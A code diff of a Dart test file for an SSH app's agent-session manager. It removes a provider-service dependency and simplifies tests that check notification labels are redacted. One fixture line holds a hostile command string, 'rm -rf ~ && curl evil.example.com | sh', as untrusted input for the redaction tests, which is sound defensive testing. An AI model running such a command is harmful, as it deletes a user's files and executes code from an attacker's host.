@@ -15,7 +15,6 @@ import 'package:monkeyssh/domain/services/acp_bridge_connector.dart';
 import 'package:monkeyssh/domain/services/acp_client.dart';
 import 'package:monkeyssh/domain/services/acp_json_rpc_connection.dart';
 import 'package:monkeyssh/domain/services/acp_lifecycle_service.dart';
-import 'package:monkeyssh/domain/services/acp_provider_service.dart';
 import 'package:monkeyssh/domain/services/acp_recent_sessions_service.dart';
 import 'package:monkeyssh/domain/services/acp_session_manager.dart';
 import 'package:monkeyssh/domain/services/acp_transport.dart';
@@ -260,7 +259,6 @@ Future<void> _pump() => Future<void>.delayed(const Duration(milliseconds: 20));
 void main() {
   late AppDatabase database;
   late SettingsService settings;
-  late AcpProviderService providerService;
   late AcpRecentSessionsService recentSessions;
   late _FakeConnector connector;
   late AcpSessionManager manager;
@@ -280,13 +278,11 @@ void main() {
   setUp(() {
     database = AppDatabase.forTesting(NativeDatabase.memory());
     settings = SettingsService(database);
-    providerService = AcpProviderService(settings);
     recentSessions = AcpRecentSessionsService(settings);
     connector = _FakeConnector();
     connectedHostIds = <int>{1, 2};
     manager = AcpSessionManager(
       connector: connector,
-      providerService: providerService,
       recentSessions: recentSessions,
       isProUnlocked: () => true,
       diagnostics: const NoopDiagnosticsLogger(),
@@ -662,10 +658,7 @@ void main() {
   });
 
   group('notification label redaction', () {
-    AcpSessionState fixture({
-      required String providerId,
-      required bool isCustomProvider,
-    }) {
+    AcpSessionState fixture(String providerId) {
       final now = DateTime.now();
       return AcpSessionState(
         key: AcpSessionKey.of(
@@ -675,7 +668,6 @@ void main() {
           acpSessionId: 'session-1',
         ),
         providerLabel: 'rm -rf ~ && curl evil.example.com | sh',
-        isCustomProvider: isCustomProvider,
         cwd: '/repo',
         status: AcpConnectionStatus.ready,
         createdAt: now,
@@ -685,46 +677,22 @@ void main() {
 
     test('uses the fixed built-in label for a built-in provider', () {
       expect(
-        acpSafeAgentDisplayLabel(
-          fixture(
-            providerId: AcpBuiltinProviderIds.copilotCli,
-            isCustomProvider: false,
-          ),
-        ),
+        acpSafeAgentDisplayLabel(fixture(AcpBuiltinProviderIds.copilotCli)),
         'Copilot CLI',
       );
       expect(
-        acpSafeAgentDisplayLabel(
-          fixture(
-            providerId: AcpBuiltinProviderIds.openCode,
-            isCustomProvider: false,
-          ),
-        ),
+        acpSafeAgentDisplayLabel(fixture(AcpBuiltinProviderIds.openCode)),
         'OpenCode',
       );
     });
 
-    test('never uses a custom/user-controlled provider label, even one that '
-        'looks like a shell command', () {
-      final label = acpSafeAgentDisplayLabel(
-        fixture(providerId: 'custom-provider-id', isCustomProvider: true),
-      );
-      expect(label, acpGenericAgentLabel);
-      expect(label, isNot(contains('rm -rf')));
-      expect(label, isNot(contains('curl')));
-    });
-
-    test('falls back to the generic label for an unrecognized non-custom '
-        'provider id', () {
-      expect(
-        acpSafeAgentDisplayLabel(
-          fixture(
-            providerId: 'builtin:future-provider',
-            isCustomProvider: false,
-          ),
-        ),
-        acpGenericAgentLabel,
-      );
+    test('falls back to the generic label for an unrecognized provider id, '
+        'never the stored label', () {
+      for (final providerId in ['custom-provider-id', 'builtin:future']) {
+        final label = acpSafeAgentDisplayLabel(fixture(providerId));
+        expect(label, acpGenericAgentLabel);
+        expect(label, isNot(contains('rm -rf')));
+      }
     });
   });
 }
